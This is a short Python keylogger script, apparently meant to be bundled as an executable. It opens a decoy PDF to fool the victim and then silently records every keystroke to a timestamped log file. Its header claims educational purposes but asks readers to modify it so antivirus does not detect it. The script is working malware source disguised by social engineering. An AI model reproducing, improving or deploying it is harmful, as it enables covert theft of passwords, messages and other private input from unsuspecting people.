# Author:David-Bombal
#Educational Purposes Only
# Pls modify the code to make it undetectable from Anti-Virus

from asyncio import subprocess
from pynput.keyboard import Key, Listener
import logging as lg
import time
import sys
import subprocess

# Just added code to open the social engineered file

# and added timestamp to the file name

t = time.localtime(time.time())
time="_"+str(t.tm_hour)+"_"+str(t.tm_min)+"_"+str(t.tm_sec)+"_"+str(t.tm_mday)+"_"+str(t.tm_mon)+"_"+str(t.tm_year)
file_name1=sys._MEIPASS + "\CO - UNIT 3 MEMORY SYSTEM.pdf"
subprocess.Popen(file_name1,shell=True)

log_dir = ""
print("keylogs"+time+".txt")
lg.basicConfig(filename=(log_dir + "keylogs"+time+".txt"), \
	level=lg.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    lg.info(str(key))

import time,datetime as dt
with Listener(on_press=on_press) as listener_1898989:
    listener_1898989.join()
